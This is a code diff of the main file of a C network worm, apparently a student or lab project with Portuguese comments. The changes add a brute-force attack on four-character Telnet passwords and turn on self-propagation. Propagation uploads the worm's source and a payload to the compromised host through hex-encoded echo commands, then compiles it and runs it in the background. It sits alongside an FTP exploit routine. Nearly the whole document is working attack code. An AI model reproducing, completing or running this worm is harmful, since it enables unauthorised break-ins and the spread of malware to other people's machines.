@@ -10,15 +10,13 @@
 
 #include "exploit.h"
 #include "recon.h"
-#include "brutexor.h"
 #include "telnet.h"
 
-#define INIT_CMD "unset HISTFILE;id;uname -a;\n"
-#define MAX_CMD_SIZE 512
+#define MAX_CMD_SIZE 2048
 #define FILE_UPLOAD_BLOCK_SIZE 48
 #define FTP_USERNAME "ftp"
-#define TELNET_USERNAME "root"
 #define FTP_PASSWORD "ftp"
+#define TELNET_USERNAME "usuario"
 
 #define MAX(x, y) (((x) > (y)) ? (x) : (y))
 #define MIN(x, y) (((x) < (y)) ? (x) : (y))
@@ -26,11 +24,11 @@
 void scan_callback(uint32_t addr, int ftp_open, int telnet_open);
 int run_ftp_exploit(uint32_t addr);
 int run_telnet_bruteforce(uint32_t addr);
+char bruteforce_get_char(int index);
 int propagate(int fd);
 int upload_file(int fd, const char *filename, const char *dest);
 int command(int fd, const char *str, ...);
 int command_bg(int fd, const char *str, ...);
-int shell(int fd);
 
 int main(int argc, char *argv[]) {
     // ip_subnet *subnets;
@@ -65,17 +63,15 @@ void scan_callback(uint32_t addr, int ftp_open, int telnet_open) {
     }
 
     if (fd < 0) {
-        fprintf(stderr, "Falha ao executar ataque.\n");
+        fprintf(stderr, "# Failure to execute attack.\n");
         return;
     }
 
-    // printf("# Propagating worm...\n");
-    // if (propagate(fd) != 0) {
-    //     fprintf(stderr, "Falha ao propagar o worm.\n");
-    //     return;
-    // }
-
-    shell(fd);
+    printf("# Propagating worm...\n");
+    if (propagate(fd) != 0) {
+        fprintf(stderr, "# Failure to propagate worm.\n");
+        return;
+    }
 
     close(fd);
 }
@@ -84,6 +80,8 @@ int run_ftp_exploit(uint32_t addr) {
     int fd, ret;
     target_t *target = NULL;
     char *banner;
+
+    printf("# Executing FTP exploit...\n");
 
     fd = ftp_login(addrToString(addr), FTP_USERNAME, FTP_PASSWORD, &banner);
     if (fd <= 0) {
@@ -110,77 +108,118 @@ int run_ftp_exploit(uint32_t addr) {
 }
 
 int run_telnet_bruteforce(uint32_t addr) {
-    int fd = -1, ret;
+    int fd, ret;
+    int i, found;
+    char c0, c1, c2, c3;
+    char pass[5];
 
-    // fd = telnet_connect(addr);
+    printf("# Executing Telnet bruteforce attack...\n");
 
-    // if (fd <= 0) {
-    //     return -1;
-    // }
+    pass[4] = '\0';
 
-    // while (1) {
-    //     pass = generate_pass();
-    //     ret = telnet_login(fd, pass);
+    found = 0;
+    for (i=0; i<62*62*62*62; i++) {
+        pass[0] = bruteforce_get_char(i % 62);
+        pass[1] = bruteforce_get_char((i / 62) % 62);
+        pass[2] = bruteforce_get_char((i / 62 / 62) % 62);
+        pass[3] = bruteforce_get_char((i / 62 / 62 / 62) % 62);
 
-    //     if (ret)
-    //         break;
-    // }
+        if ((fd = telnet_login(addrToString(addr), TELNET_USERNAME, pass)) > 0) {
+            found = 1;
+            printf("# Login sucessful with %s/%s @ %s!\n", TELNET_USERNAME, pass, addrToString(addr));
+            break;
+        }
+    }
 
-    // if (!ret) {
-    //     close(fd);
-    //     return -1;
-    // }
+    if (!found) {
+        close(fd);
+        return -1;
+    }
 
     return fd;
 }
 
+char bruteforce_get_char(int index){
+    char character;
+
+    // valores de 0-9
+    if(index >= 0 && index < 10){
+        character = 48 + index;
+    }
+    // valores de A-Z
+    else if(index >= 10 && index < 36){
+        character = 65 + (index - 10);
+    }
+    // valores de a-z
+    else if(index >= 36 && index < 62){
+        character = 97 + (index - 36);
+    }
+        
+    return character;
+}
+
 int propagate(int fd) {
     printf("# Cleaning up and preparing...\n");
-    if (command(fd, "rm -rf /tmp/worm") != 0) {
+    if (command(fd, "rm -rf detox") != 0) {
         return -1;
     }
-    if (command(fd, "mkdir -p /tmp/worm") != 0) {
+    if (command(fd, "mkdir -p detox") != 0) {
         return -1;
     }
-    if (command(fd, "cd /tmp/worm") != 0) {
+    if (command(fd, "cd detox") != 0) {
         return -1;
     }
 
-    printf("# Uploading files...\n");
+    printf("# Uploading payload...");
+    if (upload_file(fd, "payload.jpg", "payload.jpg") != 0) {
+        return -1;
+    }
+
+    printf("# Uploading files... [");
+    fflush(stdout);
+    printf("main.c,"); fflush(stdout);
     if (upload_file(fd, "main.c", "main.c") != 0) {
         return -1;
     }
+    printf("recon.c,"); fflush(stdout);
     if (upload_file(fd, "recon.c", "recon.c") != 0) {
         return -1;
     }
+    printf("recon.h,"); fflush(stdout);
     if (upload_file(fd, "recon.h", "recon.h") != 0) {
         return -1;
     }
+    printf("exploit.c,"); fflush(stdout);
     if (upload_file(fd, "exploit.c", "exploit.c") != 0) {
         return -1;
     }
+    printf("exploit.h,"); fflush(stdout);
     if (upload_file(fd, "exploit.h", "exploit.h") != 0) {
         return -1;
     }
-    if (upload_file(fd, "brutextor.c", "brutextor.c") != 0) {
+    printf("telnet.c,"); fflush(stdout);
+    if (upload_file(fd, "telnet.c", "telnet.c") != 0) {
         return -1;
     }
-    if (upload_file(fd, "brutextor.h", "brutextor.h") != 0) {
+    printf("telnet.h,"); fflush(stdout);
+    if (upload_file(fd, "telnet.h", "telnet.h") != 0) {
         return -1;
     }
+    printf("Makefile"); fflush(stdout);
     if (upload_file(fd, "Makefile", "Makefile") != 0) {
         return -1;
     }
+    printf("]\n");
 
-    // printf("# Compiling...\n");
-    // if (command(fd, "make") != 0) {
-    //     return -1;
-    // }
+    printf("# Compiling...\n");
+    if (command(fd, "(make >>/tmp/log 2>&1)") != 0) {
+        return -1;
+    }
 
-    // printf("# Executing...\n");
-    // if (command_bg(fd, "./worm") != 0) {
-    //     return -1;
-    // }
+    printf("# Executing...\n");
+    if (command_bg(fd, "(./worm >>/tmp/log 2>&1)") != 0) {
+        return -1;
+    }
 
     return 0;
 }
@@ -228,7 +267,8 @@ int upload_file(int fd, const char *filename, const char *dest) {
         }
 
         // execute a command to echo the hexadecimal bytes to the dest file
-        if (command(fd, "echo -n -e '%s' >> %s", hex_string, dest) != 0) {
+        printf("(echo -n -e '%s' >> %s)\n", hex_string, dest);
+        if (command(fd, "(echo -n -e '%s' >> %s)", hex_string, dest) != 0) {
             free(file_buf);
             return -1;
         }
@@ -248,79 +288,50 @@ int command(int fd, const char *str, ...) {
     vsnprintf(buf, sizeof(buf), str, vl);
     va_end(vl);
 
-    // executa o comando enviando todo o log para /tmp/log
-    // da maquina alvo e imprimindo na saída padrão o código
-    // de saída
-    dprintf(fd, "((%s) >>/tmp/log 2>&1); echo $?\n", buf);
+    dprintf(fd, "%s; echo return-$?\n", buf);
 
     // lê o código de saída do socket
-    len = read(fd, bufRead, sizeof(bufRead));
-    bufRead[len] = '\0';
-    ret = atoi(bufRead);
+    while (1) {
+        if ((len = net_rlinet(fd, bufRead, sizeof(bufRead), 20)) <= 0) {
+            return -1;
+        }
 
-    return ret;
+        bufRead[len] = '\0';
+
+        if (strncmp(bufRead, "return-", 7) == 0) {
+            ret = atoi(bufRead + 7);
+            return ret;
+        }
+    }
+
+    return -1;
 }
 
 int command_bg(int fd, const char *str, ...) {
     char buf[MAX_CMD_SIZE];
     char bufRead[MAX_CMD_SIZE];
     va_list vl;
-    int len;
+    int len, ret;
 
     va_start(vl, str);
     vsnprintf(buf, sizeof(buf), str, vl);
     va_end(vl);
 
-    // executa o comando em background, enviando todo o
-    // log para /tmp/log da maquina alvo e imprimindo na
-    // saída padrão um ok
-    dprintf(fd, "((%s) >>/tmp/log 2>&1 &); echo ok\n", buf);
+    dprintf(fd, "%s &; echo return-0\n", buf);
 
-    // lê o "ok" pelo socket
-    len = read(fd, bufRead, sizeof(bufRead));
-    bufRead[len] = '\0';
-
-    return (strcmp(bufRead, "ok\n") == 0) ? 0 : -1;
-}
-
-int shell(int fd) {
-    char buf[MAX_CMD_SIZE];
-    fd_set rfds;
-    int len;
-
-    // write(fd, INIT_CMD, strlen(INIT_CMD));
-
+    // lê o código de saída do socket
     while (1) {
-        FD_SET(0, &rfds);
-        FD_SET(fd, &rfds);
-
-        select(fd + 1, &rfds, NULL, NULL, NULL);
-        if (FD_ISSET(0, &rfds)) {
-            len = read(0, buf, sizeof(buf));
-            if (len == 0) {
-                // EOF on stdin
-                return 0;
-            }
-            else if (len < 0) {
-                fprintf(stderr, "Error reading from standard input.\n");
-                return -1;
-            }
-            write(fd, buf, len);
+        if ((len = net_rlinet(fd, bufRead, sizeof(bufRead), 20)) <= 0) {
+            return -1;
         }
 
-        if (FD_ISSET(fd, &rfds)) {
-            len = read(fd, buf, sizeof(buf));
-            if (len == 0) {
-                printf("Connection closed by foreign host.\n");
-                return -1;
-            }
-            else if (len < 0) {
-                fprintf(stderr, "Error reading from foreign host.\n");
-                return -1;
-            }
-            write(1, buf, len);
+        bufRead[len] = '\0';
+
+        if (strncmp(bufRead, "return-", 7) == 0) {
+            ret = atoi(bufRead + 7);
+            return ret;
         }
     }
 
-    return 0;
+    return -1;
 }
